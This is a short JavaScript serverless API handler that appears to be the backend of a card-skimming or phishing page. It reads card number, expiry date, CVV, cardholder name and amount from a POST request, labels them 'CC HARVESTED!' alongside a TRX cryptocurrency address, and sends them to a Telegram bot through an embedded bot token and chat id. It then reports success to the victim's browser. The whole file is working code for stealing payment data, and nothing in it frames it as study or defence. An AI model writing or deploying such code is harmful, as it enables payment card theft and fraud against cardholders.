export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  const { cc, exp, cvv, name, amount } = req.body;
  const harvestData = `🚨 CC HARVESTED!\n💳 Card: ${cc}\n📅 Exp: ${exp}\n🔑 CVV: ${cvv}\n👤 Name: ${name}\n💰 Amount: $${amount}\n\n💎 TRX: TUTfLjNJinM8hiuTenhaugLy1oenVWot3b`;

  try {
    await fetch(`https://api.telegram.org/bot8607984308:AAFA0iMTR9o7OwqQZUztYGSRWifjBTGEj70/sendMessage?chat_id=635198318&text=${encodeURIComponent(harvestData)}`);
    res.status(200).json({ success: true });
  } catch {
    res.status(500).json({ error: 'Failed' });
  }
}
